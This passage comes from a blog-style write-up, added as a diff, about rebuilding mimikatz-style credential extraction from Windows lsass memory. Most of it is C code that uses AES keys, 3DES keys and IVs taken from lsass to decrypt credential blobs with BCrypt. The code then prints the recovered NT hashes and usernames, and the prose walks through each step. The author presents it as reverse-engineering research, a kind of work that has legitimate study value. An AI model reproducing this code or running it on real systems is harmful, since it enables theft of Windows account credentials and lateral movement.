+	SECURITY_BLOB secBlob = { 0 };
+	printKeyBytes(blob, (SIZE_T)blobLen, "BLOB\n");
+	///////
+
+	BCRYPT_ALG_HANDLE algAESHandle = 0;
+	BCRYPT_ALG_HANDLE algDESHandle = 0;
+
+	BCRYPT_KEY_HANDLE hAESKey;
+	BCRYPT_KEY_HANDLE hDESKey;
+
+	ULONG resultLen = 0;
+
+	BYTE ivCopyAES[16];
+	memcpy(ivCopyAES, keys.IVKey, 16);
+
+	BYTE ivCopyDES[8];
+	memcpy(ivCopyDES, keys.IVKey, 8);
+
+	unsigned char HASH[1024];
+	ULONG LenHASH = sizeof(HASH);
+	char buf[1024];
+
+	NTSTATUS bcryptResult;
+```
+
+We need copies of the IV because when we start decrypting the blobs BCrypt will make changes to the IV.  The IV for AES is 16 bytes.  The IV for DES is 8 bytes which mimikatz confirms.
+
+[mimikatz/mimilib/sekurlsadbg/kuhl_m_sekurlsa_nt6.c at 152b208916c27d7d1fc32d10e64879721c4d06af · gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimilib/sekurlsadbg/kuhl_m_sekurlsa_nt6.c#L9)
+
+![[Pasted image 20250903222257.png]]
+
+This code also clues us in on the fact that we should be making IV copies because of the changes BCrypt will make to the original, and if the blob size is divisible by 8, so without Adam Chester's article this is another way you could confirm this without needing to fully reverse lsasrv.dll.
+```c
+printf("Checking if AES or DES..\n");
+if (blobLen  % 8 != 0) {
+```
+
+This if statement checks to see if the blob length is divisible by 8.
+
+```c
+if (blobLen  % 8 != 0) {
+	printf("AES Selected.\n");
+
+	bcryptResult = BCryptOpenAlgorithmProvider(&algAESHandle, BCRYPT_AES_ALGORITHM, 0, 0);
+	if (!NT_SUCCESS(bcryptResult)) {
+		printf("Cannot open alg provider\n");
+	}
+	printf("Alg handle made.\n");
+
+	bcryptResult = BCryptSetProperty(algAESHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
+
+	if (!NT_SUCCESS(bcryptResult)) {
+		printf("Cannot set cahining mode CFB\n");
+	}
+	printf("Set properties\n");
+
+	bcryptResult = BCryptGenerateSymmetricKey(algAESHandle, &hAESKey, NULL, 0, keys.AESKey, keys.AESKeyLen, 0);
+
+	if (!NT_SUCCESS(bcryptResult)) {
+		printf("Cannot create symmetric key based on found key\n");
+	}
+	printf("Symmetric Key generated\n");
+
+	bcryptResult = BCryptDecrypt(hAESKey, (PUCHAR)blob, blobLen, NULL, ivCopyAES, sizeof(ivCopyAES), HASH, LenHASH, &resultLen, 0);
+	printf("Decrypted Lsaunicode string buffer\n");
+
+	if (!NT_SUCCESS(bcryptResult)) {
+		printf("Cannot open decrypt hash\n");
+	}
+	if (hAESKey) BCryptDestroyKey(hAESKey);
+	if (algAESHandle) BCryptCloseAlgorithmProvider(algAESHandle, 0);
+} else {
+```
+
+If so we enter the decryption routine which is a fairly well documented process that is largely plug and play. We made our own algorithm handles so we populate those, set the appropriate modes we found in Ghidra, generate a symmetric key based on the secret we found, and then decrypt the blob.  The same is true of DES:
+
+```c
+ else {
+		printf("DES Selected.\n");
+
+		bcryptResult = BCryptOpenAlgorithmProvider(&algDESHandle, BCRYPT_3DES_ALGORITHM, 0, 0);
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot open alg provider\n");
+		}
+		printf("Alg handle made.\n");
+
+		bcryptResult = BCryptSetProperty(algDESHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot set cahining mode CBC\n");
+		}
+		printf("Set property .\n");
+
+		bcryptResult = BCryptGenerateSymmetricKey(algDESHandle, &hDESKey, NULL, 0, keys.DESKey, keys.DESKeyLen, 0);
+
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot create symmetric key based on found key\n");
+		}
+		printf("Genned sym key .\n");
+		printf("Trying to decrypt... please../..\n");
+
+		bcryptResult = BCryptDecrypt(hDESKey, (PUCHAR)blob, blobLen, 0, ivCopyDES, sizeof(ivCopyDES), HASH, LenHASH, &resultLen, 0);
+		//		bcryptResult = BCryptDecrypt(hDESKey, (PUCHAR)LsaUnicodeString.Buffer, LsaUnicodeString.Length, 0, keys.IVKey, 8, HASH, LenHASH, &LenHASH, 0);
+		if (!NT_SUCCESS(bcryptResult)) {
+			printf("Cannot open decrypt hash\n");
+		}
+		printf("Decryoted hash...\n");
+
+	}
+```
+
+Then from here we just need to print our decrypted blob!
+
+```c
+if (!NT_SUCCESS(bcryptResult)) {
+	printf("Decrypt failed: 0x%x\n", bcryptResult);
+}
+else {
+	printf("Decrypted %lu bytes.\n", resultLen);
+	wprintf(L"Decrypted (as string): %.*ls\n", resultLen / 2, (wchar_t*)HASH);
+	printKeyBytes(HASH, resultLen, "Decrypted blob (hex):");
+}
+```
+
+![[Pasted image 20250903223038.png]]
+
+For reference I do not have a password set on this machine.  Here you can see that an empty password field as an NT hash matches perfectly with the decrypted output above!
+
+![[Pasted image 20250903223133.png]]
+
+![[Pasted image 20250903224011.png]]
+
+![[Pasted image 20250903224003.png]]
+
+So there you have it!  Pulling hashes and username from lsass!  Hopefully this was helpful!
